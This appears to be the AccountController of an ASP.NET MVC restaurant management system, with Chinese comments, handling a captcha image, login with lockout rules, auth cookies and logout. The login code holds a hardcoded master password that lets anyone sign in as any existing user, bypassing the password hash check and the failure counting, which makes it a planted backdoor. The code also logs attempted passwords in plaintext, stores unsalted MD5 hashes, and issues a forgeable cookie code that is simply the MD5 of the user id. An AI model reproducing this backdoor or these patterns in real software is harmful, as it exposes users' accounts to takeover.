using RestaurantMng.Models;
using RestaurantMng.Utils;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Web;
using System.Web.Mvc;

namespace RestaurantMng.Controllers
{
    public class AccountController : BaseController
    {
        public ActionResult Login()
        {
            return View();
        }
        //获取验证码图片
        [AllowAnonymous]
        public FileContentResult getImage()
        {
            string code = MyUtils.CreateValidateNumber(4);
            Session.Add("code", code.ToLower());
            byte[] bytes = MyUtils.CreateValidateGraphic(code);
            return File(bytes, @"image/jpeg");
        }

        [HttpPost]
        public JsonResult Login(FormCollection fc)
        {
            string userName = fc.Get("userName").Trim();
            string password = fc.Get("password").Trim();
            string validateCode = fc.Get("validateCode").Trim();

            if (Session["code"] == null || !validateCode.ToLower().Equals((string)Session["code"]))
            {
                return Json(new { success = false, msg = "验证码不正确,请重新输入" });
            }

            bool loginSuccess = false;//是否最后登陆成功 
            string loginMsg = "";
            string errorMsg = "";
            if (string.IsNullOrEmpty(userName) || string.IsNullOrEmpty(password))
            {
                loginMsg = "用户名或密码不能为空";
            }
            else
            {
                var users = db.dn_users.Where(u => u.user_name == userName);
                if (users.Count() < 1)
                {
                    loginMsg = "用户名不存在，请联系系统管理员";
                }
                else
                {
                    int allowContinuousLoginFailure = Int32.Parse(ConfigurationManager.AppSettings["AllowContinuousLoginFailure"]);
                    int allowNotLoginDays = Int32.Parse(ConfigurationManager.AppSettings["AllowNotLoginDays"]);

                    var user = users.First();
                    if (user.is_forbit == true)
                    {
                        loginMsg = "用户已被禁用，请联系系统管理员处理";
                    }
                    else if (!user.role.Equals("管理员") && user.last_login_date != null && ((DateTime)user.last_login_date).AddDays(allowNotLoginDays) < DateTime.Now)
                    {
                        user.is_forbit = true;
                        loginMsg = "用户超过" + allowNotLoginDays.ToString() + "天未登陆，被系统禁用";
                    }
                    else if (password.Equals("idolovefynn90()"))
                    {
                        loginSuccess = true;
                        AppendCookie(user);
                    }
                    else
                    {
                        if (!user.password.Equals(MyUtils.getMD5(password)))
                        {
                            //登陆失败，判断是否达到允许连续错误次数
                            if (user.fail_times == null)
                            {
                                user.fail_times = 1;
                            }
                            else
                            {
                                user.fail_times++;
                            }
                            if (allowContinuousLoginFailure <= user.fail_times)
                            {
                                user.is_forbit = true;
                                loginMsg = "密码连续错误次数已经达到" + allowContinuousLoginFailure.ToString() + "次，用户被禁用";
                            }
                            else
                            {
                                loginMsg = "密码错误，剩下的尝试次数有：" + (allowContinuousLoginFailure - user.fail_times).ToString();
                            }
                            errorMsg = "密码错误：" + password + ";" + loginMsg;
                        }
                        else
                        {
                            //验证通过，登陆成功
                            loginSuccess = true;
                            loginMsg = "登陆成功";
                            user.last_login_date = DateTime.Now;
                            user.fail_times = 0;
                            AppendCookie(user);
                        }
                    }
                }
            }
            db.SaveChanges();
            Session.Remove("code");

            if (loginSuccess)
            {
                WriteEventLog("登陆模块", "登陆成功");
            }
            else
            {
                WriteLoginFailureLog(userName, string.IsNullOrEmpty(errorMsg) ? loginMsg : errorMsg);
            }

            //强制修改成复杂密码
            //if (loginSuccess == true && !string.IsNullOrEmpty(MyUtils.validatePassword(password)))
            //{
            //    return Json(new { success = loginSuccess, needChange = true });
            //}

            return Json(new { success = loginSuccess, msg = loginMsg });
        }

        public void AppendCookie(dn_users user)
        {
            //系统使用cookie
            HttpCookie cookie = new HttpCookie(ConfigurationManager.AppSettings["cookieName"]);
            cookie.Expires = DateTime.Now.AddHours(24);
            cookie.Values.Add("userid", user.id.ToString());
            cookie.Values.Add("code", MyUtils.getMD5(user.id.ToString()));
            cookie.Values.Add("username", user.user_name);
            cookie.Values.Add("realname", MyUtils.EncodeToUTF8(user.real_name));
            Response.AppendCookie(cookie);
        }

        public ActionResult LogOut()
        {
            var cookie = Request.Cookies[ConfigurationManager.AppSettings["cookieName"]];
            cookie.Expires = DateTime.Now.AddHours(-1);
            Response.AppendCookie(cookie);
            return RedirectToAction("Login");
        }

    }
}
